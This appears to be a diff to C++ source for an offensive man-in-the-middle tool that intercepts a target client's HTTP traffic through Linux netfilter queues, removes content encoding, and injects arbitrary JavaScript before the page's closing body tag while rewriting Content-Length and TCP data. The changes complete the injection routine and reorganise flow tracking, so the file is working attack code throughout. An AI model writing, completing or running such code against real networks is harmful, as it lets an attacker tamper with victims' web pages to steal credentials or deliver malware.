@@ -17,10 +17,7 @@ uint32_t clientSeqNum{0};
 uint32_t serverAckNum{0};
 uint32_t serverSeqNum{0};
 
-
 bool32 processRequest{TRUE};
-bool32 processServer{FALSE};
-bool32 processClient{FALSE};
 
 /*
     filters for the http request that contains the url the user wishes to inject with js code. If a matching
@@ -68,6 +65,8 @@ static bool32 FilterReq(const char* url, tcphdr* tcpHeader, char* payload, uint3
 
             PacketCraft::ConcatStr(packetFullURL, sizeof(packetFullURL), packetDomainName, packetFileName);
 
+
+            std::cout << "comparing user url (" << url << ") with packet url (" << packetFullURL << ")\n"; 
             // make sure the url in the received packet matches the url the user wants to inject
             if(PacketCraft::CompareStr(packetFullURL, url) == TRUE)
             {
@@ -144,8 +143,9 @@ static int RemoveEncoding(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, u
 static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
     CHaks::NetFilterCallbackData& callbackData)
 {
-    char* buffer = (char*)malloc(payloadLen + callbackData.codeLen + 1);
-    memset(buffer, '\0', payloadLen + callbackData.codeLen + 1);
+    uint32_t bufferLen = payloadLen + callbackData.codeLen + 1;
+    char* buffer = (char*)malloc(bufferLen);
+    memset(buffer, '\0', bufferLen);
     memcpy(buffer, payload, payloadLen);
 
     // convert to uppercase because it is case-insensitive
@@ -162,10 +162,84 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     memcpy(contentLenStr, buffer + contentLengthStartIndex, contentLenStrSize);
     contentLenStr[contentLenStrSize] = '\0';
     int contentLen = atoi(contentLenStr);
+    if(contentLen <= 0)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "atoi() error");
+        free(contentLenStr);
+        free(buffer);
+        return APPLICATION_ERROR;
+    }
 
     char newContentLenStr[64]{};
-    snprintf(newContentLenStr, 64, "%d", callbackData.codeLen + contentLen);
+    snprintf(newContentLenStr, 64, "%d\r\n", callbackData.codeLen + contentLen);
     int newContentLen = atoi(newContentLenStr);
+    if(newContentLen <= 0)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "atoi() error");
+        free(contentLenStr);
+        free(buffer);
+        return APPLICATION_ERROR;
+    }
+
+    int codeStartIndex = PacketCraft::FindInStr(buffer, "</BODY>");
+    if(codeStartIndex == -1)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::FindInStr() error");
+        free(contentLenStr);
+        free(buffer);
+        return APPLICATION_ERROR;
+    }
+
+    char* bufferPtr = buffer;
+    char* payloadPtr = payload;
+    memset(buffer, '\0', bufferLen);   
+
+    // copy everything from start of payload up until the value in Content-Length: 
+    memcpy(bufferPtr, payloadPtr, contentLengthStartIndex);
+    bufferPtr += contentLengthStartIndex;
+    payloadPtr += contentLengthEndIndex + 2;
+
+    // copy the new content length value 
+    memcpy(bufferPtr, newContentLenStr, PacketCraft::GetStrLen(newContentLenStr));
+    bufferPtr += PacketCraft::GetStrLen(newContentLenStr);
+
+    // copy evething up until </body> tag (</body> excluded)
+    memcpy(bufferPtr, payloadPtr, codeStartIndex - (contentLengthEndIndex + 2));
+    bufferPtr += codeStartIndex - (contentLengthEndIndex + 2);
+    payloadPtr = payload + codeStartIndex;
+
+    // copy the code into the buffer
+    memcpy(bufferPtr, callbackData.code, callbackData.codeLen);
+    bufferPtr += callbackData.codeLen;
+
+    // copy everything else from the payload starting at the </body> tag
+    memcpy(bufferPtr, payloadPtr, payloadLen - codeStartIndex);
+
+
+    if(ipVersion == AF_INET)
+    {
+        if(nfq_tcp_mangle_ipv4(pkBuff, 0, payloadLen, buffer, bufferLen) < 0)
+        {
+            free(contentLenStr);
+            free(buffer);
+            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
+            return APPLICATION_ERROR;
+        }
+    }
+    else // NOTE: NOT TESTED!
+    {
+        if(nfq_tcp_mangle_ipv6(pkBuff, 0, payloadLen, buffer, bufferLen) < 0)
+        {
+            free(contentLenStr);
+            free(buffer);
+            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
+            return APPLICATION_ERROR;
+        }
+    }
+
+    free(contentLenStr);
+    free(buffer);
+    return NO_ERROR;
 }
 
  static int nfq_send_verdict(int queue_num, uint32_t id, mnl_socket* nl, pkt_buff* pkBuff, int verdict = NF_ACCEPT)
@@ -211,14 +285,24 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     if(ipVersion == AF_INET)
     {
         sockaddr_in targetAddr{};
-        inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
+        if(inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr) != 1)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return -1;
+        } 
+
         if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
             return 1;
     }
     else if(ipVersion == AF_INET6)
     {
         sockaddr_in6 targetAddr{};
-        inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
+        if(inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr) != 1)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return -1;
+        }
+
         if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
             return 1;
     }
@@ -226,6 +310,7 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
 
     if(FilterReq(callbackData.url, tcpHeader, (char*)tcpPayload, clientAckNum) == TRUE)
     {
+        std::cout << "request filtered\n";
         if(ipVersion == AF_INET)
         {
             if(inet_ntop(AF_INET, &ipv4Header->daddr, callbackData.serverIPStr, INET6_ADDRSTRLEN) == nullptr)
@@ -243,86 +328,101 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
             }
         }
 
+        std::cout << "serverIP (" << callbackData.serverIPStr << ") saved\n";
+
         return 0;
     }
 
     return 1;
  }
 
-  // returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed, 2 when
-  // a packet belonging to the correct tcp flow is found but it's not the one containing the </body> tag
- static int ProcessServer(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header, tcphdr* tcpHeader, 
-    char* tcpPayload, uint32_t tcpPayloadLen, CHaks::NetFilterCallbackData& callbackData)
- {
-    // Filter for a matching IP
+// returns 0 if traffic of the correct tcp flow is coming from the client, 1 if it's coming from the server, and 2
+// if neither. returns - 1 on error. global client and server ack/seq nums are also set
+static int FilterIPAndTCP(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header, tcphdr* tcpHeader, 
+    CHaks::NetFilterCallbackData& callbackData)
+{
+    // Filter for a matching client packet based on IP
     if(ipVersion == AF_INET)
     {
         sockaddr_in targetAddr{};
-        inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
-        if(targetAddr.sin_addr.s_addr != ipv4Header->daddr)
-            return 1;
-    }
-    else if(ipVersion == AF_INET6)
-    {
-        sockaddr_in6 targetAddr{};
-        inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
-        if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
-            return 1;
-    }
-    //////////
-
-    if(tcpHeader->seq == clientAckNum)
-    {
-        serverAckNum = tcpHeader->ack_seq;
-        serverSeqNum = tcpHeader->seq;
-
-        if(tcpPayloadLen > 0)
+        if(inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr) != 1)
         {
-            int res = PacketCraft::FindInStr(tcpPayload, "</body>");
-            if(res > -1)
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return -1;
+        }
+
+        sockaddr_in serverAddr{};
+        if(inet_pton(AF_INET, callbackData.serverIPStr, &serverAddr.sin_addr) != 1)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return -1; 
+        }
+
+        // check if traffic is coming from the desired target client
+        if(targetAddr.sin_addr.s_addr == ipv4Header->saddr && serverAddr.sin_addr.s_addr == ipv4Header->daddr)
+        {
+            if(tcpHeader->seq == serverAckNum)
             {
+                clientAckNum = tcpHeader->ack_seq;
+                clientSeqNum = tcpHeader->seq;
                 return 0;
             }
         }
-
-        return 2;
-    }
-
-    return 1;
- }
-
-// returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed
-static int ProcessClient(uint32_t ipVersion, iphdr* ipv4Header, ip6_hdr* ipv6Header, tcphdr* tcpHeader, 
-    CHaks::NetFilterCallbackData& callbackData)
-{
-    // Filter for a matching IP
-    if(ipVersion == AF_INET)
-    {
-        sockaddr_in targetAddr{};
-        inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
-        if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
-            return 1;
+        // check if traffic is coming from the server
+        else if(targetAddr.sin_addr.s_addr == ipv4Header->daddr && serverAddr.sin_addr.s_addr == ipv4Header->saddr)
+        {
+            if(tcpHeader->seq == clientAckNum)
+            {
+                serverAckNum = tcpHeader->ack_seq;
+                serverSeqNum = tcpHeader->seq;
+                return 1;
+            }
+        }
     }
     else if(ipVersion == AF_INET6)
     {
         sockaddr_in6 targetAddr{};
-        inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
-        if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
-            return 1;
+        if(inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr) != 1)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return -1;
+        }
+
+        sockaddr_in6 serverAddr{};
+        if(inet_pton(AF_INET6, callbackData.serverIPStr, &serverAddr.sin6_addr) != 1)
+        {
+            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
+            return -1;
+        }
+
+        // check if traffic is coming from the desired target client
+        if((memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) == 0) && 
+            (memcmp(serverAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) == 0))
+        {
+            if(tcpHeader->seq == serverAckNum)
+            {
+                clientAckNum = tcpHeader->ack_seq;
+                clientSeqNum = tcpHeader->seq;
+                return 0;
+            }
+        }
+        // check if traffic is coming from the server
+        else if((memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) == 0) && 
+                (memcmp(serverAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) == 0))
+        {
+            if(tcpHeader->seq == clientAckNum)
+            {
+                serverAckNum = tcpHeader->ack_seq;
+                serverSeqNum = tcpHeader->seq;
+                return 1;
+            }
+        }
     }
     //////////
+    /////////////////////////////////////////////////////////////////
 
-    if(tcpHeader->seq == serverAckNum)
-    {
-        clientAckNum = tcpHeader->ack_seq;
-        clientSeqNum = tcpHeader->seq;
-
-        return 0;
-    }
-
-    return 1;
+    return 2;
 }
-
 
 static int queueCallback(const nlmsghdr *nlh, void *data)
 {
@@ -374,6 +474,11 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         ipVersion = AF_INET;
     else if(ntohs(ph->hw_protocol) == ETH_P_IPV6)
         ipVersion = AF_INET6;
+    else
+    {
+        LOG_ERROR(APPLICATION_ERROR, "unknown hw_protocol");
+        return MNL_CB_ERROR;
+    }
 
     pkt_buff* pkBuff = pktb_alloc(ipVersion, payload, plen, 4'096);
     if(pkBuff == nullptr)
@@ -462,6 +567,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         int res = ProcessRequest(ipVersion, ipv4Header, ipv6Header, tcpHeader, (char*)tcpPayload, tcpPayloadLen, callbackData);
         if(res == 0)
         {
+            std::cout << "removing encoding...\n";
             if(RemoveEncoding(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen) == APPLICATION_ERROR)
             {
                 pktb_free(pkBuff);
@@ -470,9 +576,6 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
             }
 
             processRequest = FALSE;
-            processServer = TRUE;
-            processClient = FALSE;
-
             std::cout << "request processed succesfully, encoding removed and client ack and seq number set\n";
         }
         else if(res == -1)
@@ -484,48 +587,37 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
     }
     else
     {
-        if(processServer == TRUE)
+        int res = FilterIPAndTCP(ipVersion, ipv4Header, ipv6Header, tcpHeader, callbackData);
+        if(res == 1) // process server
         {
-            int res = ProcessServer(ipVersion, ipv4Header, ipv6Header, tcpHeader, (char*)tcpPayload, tcpPayloadLen, callbackData);
-            if(res == 0)
+            std::cout << "server packet belonging to the tcp flow found\n";
+            if(tcpPayloadLen > 0)
             {
-                if(InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
+                res = PacketCraft::FindInStr((char*)tcpPayload, "</body>");
+                if(res > -1)
                 {
-                    pktb_free(pkBuff);
-                    LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
-                    return MNL_CB_ERROR;
+                    if(InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
+                    {
+                        pktb_free(pkBuff);
+                        LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
+                        return MNL_CB_ERROR;
+                    }
                 }
-
-                processRequest = FALSE;
-                processClient = FALSE;
-                processServer = FALSE;
-            }
-            else if(res == 2)
-            {
-                processClient = TRUE;
-                processServer = FALSE;
-            }
-            else if(res == -1)
-            {
-                pktb_free(pkBuff);
-                LOG_ERROR(APPLICATION_ERROR, "ProcessResponse() error");
-                return MNL_CB_ERROR;
             }
         }
-        else if(processClient == TRUE)
+        else if(res == 0)
         {
-            int res = ProcessClient(ipVersion, ipv4Header, ipv6Header, tcpHeader, callbackData);
-            if(res == 0)
-            {
-                processServer = TRUE;
-                processClient = FALSE;
-            }
-            else if(res == -1)
-            {
-                pktb_free(pkBuff);
-                LOG_ERROR(APPLICATION_ERROR, "ProcessResponse() error");
-                return MNL_CB_ERROR;
-            }
+            std::cout << "client packet belonging to the tcp flow processed\n";
+        }
+        else if(res == 2)
+        {
+            std::cout << "packet not belonging to the tcp flow ignored\n";
+        }
+        else if(res == -1)
+        {
+            pktb_free(pkBuff);
+            LOG_ERROR(APPLICATION_ERROR, "FilterIPAndTCP() error");
+            return MNL_CB_ERROR;
         }
     }
 
